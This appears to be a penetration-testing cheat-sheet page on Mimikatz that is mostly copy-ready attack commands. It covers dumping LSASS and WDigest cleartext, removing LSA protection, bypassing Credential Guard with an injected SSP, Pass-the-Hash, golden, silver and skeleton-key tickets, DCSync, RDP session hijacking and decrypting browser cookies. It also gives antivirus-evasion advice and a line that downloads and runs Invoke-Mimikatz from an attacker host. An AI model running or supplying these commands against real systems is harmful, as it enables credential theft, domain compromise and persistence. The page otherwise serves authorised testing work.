# Mimikatz

Mimikatz is a Windows credential-extraction tool. Once you land an administrative shell on an internal network, it can turn that access into plaintext passwords, NTLM hashes, Kerberos tickets, and, on a Domain Controller, the keys to the whole domain. Run it in memory where you can; drop the binary only when necessary.

{% hint style="danger" %}
Mimikatz needs local admin + `SeDebugPrivilege` to read LSASS, and modern Defender flags the binary on sight. Prefer reflective PowerShell loading (`Invoke-Mimikatz`), an LSASS minidump you parse offline with `pypykatz`, or NetExec's `-M lsassy`. Reserve the raw `.exe` for hosts where you've confirmed AV is off.
{% endhint %}

## Execute commands

```powershell
# One-liner: elevate, dump, exit
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Interactive console
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # log                          # tee output to mimikatz.log
mimikatz # sekurlsa::logonpasswords
```

Almost every command needs `privilege::debug` first — it acquires the debug rights required to read other processes' memory.

## Extract passwords from memory

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # all providers, all sessions
mimikatz # sekurlsa::wdigest            # WDigest cleartext (if enabled)
```

### `sekurlsa::logonpasswords` provider legend

Each session prints a block per credential provider. Grep for what's usable:

| Provider | Contains | Usable? |
| --- | --- | --- |
| `msv` | Primary NTLM + SHA1 + DPAPI derivative | YES — Pass-the-Hash with the `NTLM :` value |
| `tspkg` | RDP-related (usually null on modern Windows) | rare — cleartext if present |
| `wdigest` | Digest-auth cleartext (needs `UseLogonCredential=1`) | YES when non-null — plaintext password |
| `kerberos` | Kerberos tickets, sometimes plaintext | YES — plaintext if present, or reuse tickets |
| `ssp` | Legacy Security Support Provider | rare |
| `credman` | Credential Manager (saved RDP/mstsc creds) | YES — see `Target :` + `Password :` |
| `cloudap` | Azure AD / Entra Primary Refresh Token | YES for AAD lateral (PRT abuse) |

### Re-enable WDigest (Server 2012+)

Microsoft disabled LSASS cleartext storage from Win8.1 / 2012R2. Flip it back on, then force a re-auth to capture cleartext:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

Depending on OS, the value takes effect after a lock, sign-out, or reboot — plan for the victim to re-authenticate before you dump again.

### Domain cached credentials (DCC2)

Different from local SAM users — `cache` reads offline cached domain logons from `HKLM\SECURITY`:

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```

Format for hashcat: `$DCC2$10240#<username>#<hash>`, crack with `hashcat -m 2100` (slow, PBKDF2-SHA1). DCC2 hashes **cannot** be used for Pass-the-Hash.

## LSA protection workarounds

### RunAsPPL (LSASS as a protected process)

```powershell
# Check if LSA runs protected (RunAsPPL = 0x1)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

If protected, load the signed driver to strip the flag:

```powershell
mimikatz # !+                                        # load mimidriver.sys
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe        # restore protection
mimikatz # !-                                         # unload driver
```

Alternative without loading the driver:

```powershell
PPLdump.exe lsass.exe lsass.dmp
```

### Credential Guard (LSAISO / virtualized LSA)

```powershell
tasklist | findstr lsaiso
Get-ComputerInfo | Select-String "DeviceGuardSecurityServicesRunning"
```

When Credential Guard is on, `sekurlsa::logonpasswords` returns hashes wrapped in `LSA Isolated Data: NtlmHash` blobs — unusable directly. Bypass by injecting a rogue SSP that logs auth **after** decryption:

```powershell
mimikatz # privilege::debug
mimikatz # misc::memssp                              # inject SSP (mimilib.dll in same folder)
# Injected =)

# Force a re-auth: lock/unlock, RDP reconnect, or  runas /user:<DOMAIN>\admin cmd.exe

# Read captured cleartext
PS> type C:\Windows\System32\mimilsa.log
```

{% hint style="warning" %}
`memssp` is persistent until reboot and its log file is discoverable — it's a real, findable artifact. Clean up (`Remove-Item C:\Windows\System32\mimilsa.log -Force`) and note it in the report if you can't reboot the host.
{% endhint %}

## Dump LSASS to a file (parse offline)

Dumping LSASS to disk and parsing it on Kali keeps Mimikatz off the target.

```powershell
# procdump (Sysinternals) — using the PID helps evade the AV name-match on lsass.exe
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
tasklist /fi "imagename eq lsass.exe"
C:\Users\Public\procdump.exe -accepteula -ma <LSASS_PID> lsass.dmp

# Or the LOLBIN, no upload needed
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

Extract offline:

```powershell
# Mimikatz on the dump
.\mimikatz.exe "sekurlsa::minidump lsass.dmp"
mimikatz # sekurlsa::logonpasswords
```

```bash
# pypykatz on Kali — no Windows needed
pypykatz lsa minidump lsass.dmp
```

## Pass-the-Hash

Spawn a process authenticated with an NTLM hash — no password required.

```powershell
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:powershell
```

## Kerberos ticket attacks

### Golden Ticket

Forge a TGT with the `krbtgt` hash to impersonate anyone, indefinitely — full domain persistence.

```powershell
.\mimikatz.exe "kerberos::golden /admin:<USER> /domain:<DOMAIN> /id:<RID> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt" exit
```

Get the pieces first: `<DOMAIN_SID>` from `whoami /user` or `Get-ADDomain`, `<KRBTGT_HASH>` from a DCSync of the krbtgt account (below).

### Silver Ticket

Forge a service ticket (TGS) for one service using that service account's hash — no DC contact, quieter than a golden ticket.

```powershell
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:<SERVICE> /rc4:<HASH> /ptt
```

### Skeleton Key

Patch LSASS on a DC so a master password authenticates as any user (non-persistent, gone on reboot).

```powershell
privilege::debug
misc::skeleton
# Now any account authenticates with the skeleton password "mimikatz"
```

## DCSync — domain hashes without touching the DC

Ask a DC to replicate account secrets using DCSync rights held by Domain Admins, Enterprise Admins, or a delegated account. Successful replication demonstrates the impact of those privileges.

```powershell
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt      # grab krbtgt for Golden Tickets
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
```

## RDP session takeover

```powershell
# Allow >2 concurrent RDP sessions, list, and hijack without a password
privilege::debug
token::elevate
ts::sessions
ts::remote /id:<SESSION_ID>
```

Or hijack via a SYSTEM service with `tscon.exe`:

```powershell
query user
create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:rdp-tcp#<N>"
net start sesshijack
```

## Credential Manager & DPAPI

```powershell
# List then decrypt stored credentials
dir C:\Users\<USER>\AppData\Local\Microsoft\Credentials\*
.\mimikatz.exe "dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<BLOB>"
.\mimikatz.exe "!sekurlsa::dpapi"                     # recover master keys
```

```powershell
# Chrome saved cookies / logins (chain a stolen cookie for session hijack)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Task Scheduler / Vault stored creds
vault::cred /patch
```

## Command reference

| Command | Purpose |
| --- | --- |
| `PRIVILEGE::Debug` | Acquire debug rights — prerequisite for most commands |
| `TOKEN::Elevate` | Impersonate a token; elevate to SYSTEM or grab a DA token |
| `SEKURLSA::LogonPasswords` | Dump all provider creds for logged-on users |
| `SEKURLSA::Pth` | Pass-the-Hash / Over-Pass-the-Hash |
| `SEKURLSA::Ekeys` | List Kerberos encryption keys (AES keys for tickets) |
| `SEKURLSA::Tickets` | List all Kerberos tickets in memory |
| `SEKURLSA::Krbtgt` | Retrieve the KRBTGT password data |
| `LSADUMP::DCSync` | Replicate account secrets from a DC without code on it |
| `LSADUMP::SAM` | Dump local SAM hashes |
| `LSADUMP::LSA` | Dump SAM/AD secrets from a DC or `lsass.dmp` |
| `LSADUMP::Cache` | Dump cached domain creds (DCC2 / MSCache2) |
| `LSADUMP::Secrets` | LSA secrets — DPAPI master keys, service cleartext creds |
| `LSADUMP::Trust` | Dump trust keys for all domain trusts |
| `KERBEROS::Golden` | Forge golden / silver / trust tickets |
| `KERBEROS::PTT` | Pass-the-Ticket — inject a stolen or forged ticket |
| `KERBEROS::List` | List tickets in memory (no privileges needed) |
| `MISC::MemSSP` | Inject a rogue SSP to log auth in cleartext |
| `MISC::Skeleton` | Inject a Skeleton Key into a DC's LSASS |
| `MISC::AddSid` | Add SIDHistory to an account |

## Run in memory (no binary on disk)

Reflectively load Mimikatz to dodge the on-disk AV signature:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"
```

`Invoke-Mimikatz` ships in PowerSploit and PowerShell Empire.

## Related

* [CrackMapExec / NetExec](crackmapexec-netexec.md) — remote LSASS dumping (`-M lsassy`) and `--sam`/`--lsa`/`--ntds`
* [Relay & Coerce](relay-and-coerce.md) — how you reach the admin session Mimikatz needs
* [AD Attacks](ad-attacks.md) · [Kerberos Attacks](kerberos-attacks.md) — golden/silver tickets and DCSync in the wider chain
* [Credential Dumping](credential-dumping.md) · [Password Hash Attacks](password-hash-attacks.md) · [Lateral Movement](lateral-movement.md) — using what you extract
* [Report Writing](report-writing.md) — documenting credential access and the memssp artifact
